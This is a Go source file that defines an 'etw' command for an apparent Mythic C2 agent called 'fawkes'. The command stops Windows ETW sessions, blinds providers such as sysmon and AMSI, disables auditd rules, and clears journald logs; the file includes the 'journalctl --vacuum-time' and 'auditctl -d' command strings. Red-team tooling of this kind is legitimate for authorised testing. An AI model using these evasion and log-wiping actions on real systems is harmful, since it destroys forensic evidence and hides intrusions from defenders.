package agentfunctions

import (
	"fmt"
	"path/filepath"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name: "etw",
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "etw_new.js"),
			Author:     "@galoryber",
		},
		Description:         "Audit/telemetry subsystem manipulation. Windows: ETW trace sessions and providers. Linux: auditd rules, journald, syslog, SIEM agent detection. macOS: unified logging, security agent detection.",
		HelpString:          "# Windows\netw -action sessions\netw -action stop -session_name EventLog-Security\n# Linux\netw -action rules\netw -action agents\netw -action journal-clear -provider 1s\netw -action syslog-config\n# macOS\netw -action categories\netw -action agents",
		Version:             4,
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1082", "T1562.001", "T1562.002", "T1562.006", "T1070.002"},
		SupportedUIFeatures: []string{},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{
				agentstructs.SUPPORTED_OS_WINDOWS,
				agentstructs.SUPPORTED_OS_LINUX,
				agentstructs.SUPPORTED_OS_MACOS,
			},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:          "action",
				CLIName:       "action",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:       []string{"sessions", "providers", "stop", "blind", "query", "enable", "rules", "disable-rule", "journal-clear", "journal-rotate", "syslog-config", "agents", "audit-status", "categories"},
				DefaultValue:  "sessions",
				Description:   "Windows: sessions/providers/stop/blind/query/enable. Linux: rules/disable-rule/journal-clear/journal-rotate/syslog-config/agents/audit-status. macOS: categories/agents/audit-status.",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     1,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:          "session_name",
				CLIName:       "session_name",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:  "",
				Description:   "Windows: ETW session name (for stop/blind). Linux: audit rule spec (for disable-rule). Examples: EventLog-Security, '-w /etc/passwd -p wa'",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     2,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:          "provider",
				CLIName:       "provider",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:  "",
				Description:   "Windows: provider GUID or shorthand (for blind). Linux: vacuum duration for journal-clear (default: 1s). macOS: subsystem filter for categories. Shorthands: sysmon, amsi, powershell, dotnet, winrm, wmi",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     3,
						GroupName:           "Default",
					},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			msg := fmt.Sprintf("OPSEC WARNING: Audit subsystem manipulation (action: %s). ", action)
			switch action {
			case "stop":
				msg += "Stopping ETW sessions disables telemetry. EDR products monitor for ETW tampering (T1562.006)."
			case "blind":
				msg += "Blinding ETW providers removes telemetry sources — a well-known evasion technique that EDR vendors specifically detect (T1562.006)."
			case "disable-rule":
				msg += "Disabling auditd rules removes syscall monitoring. Security teams monitor auditd configuration changes. Requires root."
			case "journal-clear":
				msg += "Clearing journal logs destroys forensic evidence (T1070.002). Journald vacuum operations are logged by systemd."
			case "journal-rotate":
				msg += "Rotating journal files is lower risk but may trigger log management alerts."
			default:
				msg += "Audit enumeration is lower risk but unusual behavior may be logged."
			}
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID: taskData.Task.ID, Success: true,
				OpsecPreBlocked: false, OpsecPreMessage: msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			action, _ := processResponse.TaskData.Args.GetStringArg("action")
			switch action {
			case "sessions":
				// Parse session names from text table output
				for _, line := range strings.Split(responseText, "\n") {
					trimmed := strings.TrimSpace(line)
					if trimmed == "" || strings.HasPrefix(trimmed, "Active ETW") || strings.HasPrefix(trimmed, "SESSION") || strings.HasPrefix(trimmed, "---") {
						continue
					}
					// Session lines have: NAME (padded) EVENTS SECURITY_RELEVANCE
					fields := strings.Fields(trimmed)
					if len(fields) >= 1 && !strings.HasPrefix(trimmed, "No active") {
						sessionName := fields[0]
						createArtifact(processResponse.TaskData.Task.ID, "Configuration",
							fmt.Sprintf("ETW Session: %s", sessionName))
					}
				}
			case "stop":
				sessionName, _ := processResponse.TaskData.Args.GetStringArg("session_name")
				if strings.Contains(responseText, "Stopped") || strings.Contains(responseText, "stopped") {
					createArtifact(processResponse.TaskData.Task.ID, "Configuration",
						fmt.Sprintf("ETW Session Stopped: %s", sessionName))
				}
			case "blind":
				provider, _ := processResponse.TaskData.Args.GetStringArg("provider")
				sessionName, _ := processResponse.TaskData.Args.GetStringArg("session_name")
				if strings.Contains(responseText, "Disabled") || strings.Contains(responseText, "disabled") || strings.Contains(responseText, "blinded") {
					createArtifact(processResponse.TaskData.Task.ID, "Configuration",
						fmt.Sprintf("ETW Provider Blinded: %s (session: %s)", provider, sessionName))
				}
			case "enable":
				provider, _ := processResponse.TaskData.Args.GetStringArg("provider")
				sessionName, _ := processResponse.TaskData.Args.GetStringArg("session_name")
				if strings.Contains(responseText, "Enabled") || strings.Contains(responseText, "enabled") {
					createArtifact(processResponse.TaskData.Task.ID, "Configuration",
						fmt.Sprintf("ETW Provider Enabled: %s (session: %s)", provider, sessionName))
				}
			}
			return response
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			action, _ := taskData.Args.GetStringArg("action")
			sessionName, _ := taskData.Args.GetStringArg("session_name")
			provider, _ := taskData.Args.GetStringArg("provider")
			display := fmt.Sprintf("action: %s", action)
			if sessionName != "" {
				display += fmt.Sprintf(", session: %s", sessionName)
			}
			if provider != "" {
				display += fmt.Sprintf(", provider: %s", provider)
			}
			response.DisplayParams = &display
			switch action {
			case "stop":
				createArtifact(taskData.Task.ID, "API Call", fmt.Sprintf("ETW ControlTrace(EVENT_TRACE_CONTROL_STOP) session=%s", sessionName))
				logOperationEvent(taskData.Task.ID,
					fmt.Sprintf("[DEFENSE EVASION] etw stop: killing trace session %s on %s", sessionName, taskData.Callback.Host), true)
			case "blind":
				createArtifact(taskData.Task.ID, "API Call", fmt.Sprintf("ETW EnableTraceEx2(EVENT_CONTROL_CODE_DISABLE_PROVIDER) session=%s provider=%s", sessionName, provider))
				logOperationEvent(taskData.Task.ID,
					fmt.Sprintf("[DEFENSE EVASION] etw blind: disabling provider %s in session %s on %s", provider, sessionName, taskData.Callback.Host), true)
			case "enable":
				createArtifact(taskData.Task.ID, "API Call", fmt.Sprintf("ETW EnableTraceEx2(EVENT_CONTROL_CODE_ENABLE_PROVIDER) session=%s provider=%s", sessionName, provider))
			case "disable-rule":
				createArtifact(taskData.Task.ID, "Process Create", fmt.Sprintf("auditctl -d %s", sessionName))
				logOperationEvent(taskData.Task.ID,
					fmt.Sprintf("[DEFENSE EVASION] etw disable-rule: removing auditd rule '%s' on %s", sessionName, taskData.Callback.Host), true)
			case "journal-clear":
				createArtifact(taskData.Task.ID, "Process Create", fmt.Sprintf("journalctl --rotate && journalctl --vacuum-time=%s", provider))
				logOperationEvent(taskData.Task.ID,
					fmt.Sprintf("[DEFENSE EVASION] etw journal-clear: clearing journal logs on %s", taskData.Callback.Host), true)
			}
			return response
		},
	})
}
